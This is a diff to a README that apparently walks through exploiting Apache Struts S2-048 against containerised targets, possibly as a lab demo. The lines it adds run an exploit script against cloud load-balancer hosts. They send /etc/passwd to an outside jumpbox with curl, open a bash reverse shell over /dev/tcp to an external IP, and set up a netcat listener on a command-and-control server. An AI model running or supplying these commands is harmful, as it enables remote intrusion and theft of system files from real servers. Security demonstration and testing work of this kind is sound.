@@ -39,12 +39,21 @@ curl 127.0.0.1:8080/showcase.action -v
 #python3 -m venv .  
 python exploitS2-048-cmd.py 127.0.0.1:8080 'cat /etc/passwd'  
 
+#from your cc server do python3 webserver.py
+
+`python exploitS2-048-cmd.py a31daafb811f24dc6b521914a12433e6-1984373561.us-west-2.elb.amazonaws.com:8080 'curl jumpbox.brett1.com:8080\hi_from_inside_the_container_in_our_cluster`  
+
+`python exploitS2-048-cmd.py a31daafb811f24dc6b521914a12433e6-1984373561.us-west-2.elb.amazonaws.com:8080 'curl -d @/etc/passwd jumpbox.brett1.com:8080`  
+
+#on your cc server do nc -l 4242  
 `python exploitS2-048-cmd.py a3dc6544a26b64b7cbe1610fd1714538-870897122.us-west-2.elb.amazonaws.com:8080 'bash -i >& /dev/tcp/52.206.9.54/4242 0>&1'`
 
 
-![struts_rs](https://user-images.githubusercontent.com/4404271/153033823-b0d10a6b-4faa-4f0e-b8d1-8dde69cf1562.gif)
+#![struts_rs](https://user-images.githubusercontent.com/4404271/153033823-b0d10a6b-4faa-4f0e-b8d1-8dde69cf1562.gif)
+
 ![image](https://user-images.githubusercontent.com/4404271/153435925-60ccd750-ad11-4f80-ad72-e27f01d75e09.png)
 
 ![image](https://user-images.githubusercontent.com/4404271/153435839-90ef50c2-baeb-431b-b1ee-2338e5229509.png)
 
+![image](https://user-images.githubusercontent.com/4404271/153490296-a07fb685-8b04-48bb-8af0-7bff11cc2c21.png)
 
